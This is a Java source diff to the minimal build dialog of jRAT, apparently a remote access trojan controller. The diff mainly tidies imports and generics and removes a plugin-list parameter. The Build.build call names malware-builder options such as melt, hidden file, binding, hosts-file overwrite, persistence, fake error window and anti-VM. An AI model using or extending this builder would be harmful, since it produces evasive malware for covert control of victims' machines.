@@ -6,7 +6,6 @@ import jrat.controller.Constants;
 import jrat.controller.ErrorDialog;
 import jrat.controller.Globals;
 import jrat.controller.OSConfig;
-import jrat.controller.addons.PluginList;
 import jrat.controller.build.Build;
 import jrat.controller.build.BuildStatus;
 import jrat.controller.listeners.MinimalBuildListener;
@@ -15,29 +14,18 @@ import jrat.controller.net.PortListener;
 import jrat.controller.settings.Settings;
 import jrat.controller.ui.components.PortListenerJComboBox;
 import jrat.controller.utils.NetUtils;
-import java.awt.Toolkit;
+import oslib.OperatingSystem;
+
+import javax.swing.*;
+import javax.swing.GroupLayout.Alignment;
+import javax.swing.LayoutStyle.ComponentPlacement;
+import javax.swing.border.EmptyBorder;
+import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.io.File;
 import java.net.InetAddress;
 import java.util.LinkedHashMap;
-import javax.swing.DefaultComboBoxModel;
-import javax.swing.GroupLayout;
-import javax.swing.GroupLayout.Alignment;
-import javax.swing.JButton;
-import javax.swing.JComboBox;
-import javax.swing.JFileChooser;
-import javax.swing.JLabel;
-import javax.swing.JPanel;
-import javax.swing.JProgressBar;
-import javax.swing.JSpinner;
-import javax.swing.JTextField;
-import javax.swing.JToolBar;
-import javax.swing.LayoutStyle.ComponentPlacement;
-import javax.swing.SpinnerNumberModel;
-import javax.swing.border.EmptyBorder;
-
-import oslib.OperatingSystem;
 
 
 @SuppressWarnings("serial")
@@ -50,7 +38,7 @@ public class FrameBuildMinimal extends BaseFrame {
 	private JTextField txtId;
 	private JTextField txtFile;
 	private JTextField txtPass;
-	private JComboBox<String> cbLocation;
+	private JComboBox cbLocation;
 	private JProgressBar progressBar;
 	private JButton btnBuild;
 	private LinkedHashMap<String, BuildStatus> statuses = new LinkedHashMap<String, BuildStatus>();
@@ -93,8 +81,8 @@ public class FrameBuildMinimal extends BaseFrame {
 		txtId.setText(Settings.getGlobal().getString(Settings.KEY_BUILD_ID));
 		txtId.setColumns(10);
 
-		cbLocation = new JComboBox<String>();
-		cbLocation.setModel(new DefaultComboBoxModel<String>(DropLocations.STRINGS));
+		cbLocation = new JComboBox();
+		cbLocation.setModel(new DefaultComboBoxModel(DropLocations.STRINGS));
 
 		JLabel lblKeyfile = new JLabel("Key/File:");
 
@@ -113,7 +101,7 @@ public class FrameBuildMinimal extends BaseFrame {
 		JToolBar toolBar = new JToolBar();
 		toolBar.setFloatable(false);
 
-		JComboBox<?> comboBox = new PortListenerJComboBox(new SocketComboBoxListener() {
+		JComboBox comboBox = new PortListenerJComboBox(new SocketComboBoxListener() {
 			@Override
 			public void onChange(PortListener pl) {
 				txtPass.setText(pl.getPass());
@@ -274,7 +262,6 @@ public class FrameBuildMinimal extends BaseFrame {
 				int droptarget = -1;
 				boolean usemutex = false;
 				int mutexport = -1;
-				PluginList pluginlist = null;
 				boolean timeout = false;
 				int timeoutms = -1;
 				boolean delay = false;
@@ -297,7 +284,7 @@ public class FrameBuildMinimal extends BaseFrame {
 				osconfig.addOS(OperatingSystem.LINUX);
 				boolean antivm = false;
 
-				Build.build(l, Globals.getStub(), file, addresses, id, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, droptarget, usemutex, mutexport, pluginlist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);
+				Build.build(l, Globals.getStub(), file, addresses, id, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, droptarget, usemutex, mutexport, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);
 
 				Settings.getGlobal().set(Settings.KEY_BUILD_ID, id);
 				Settings.getGlobal().setBuildPassword(pass);
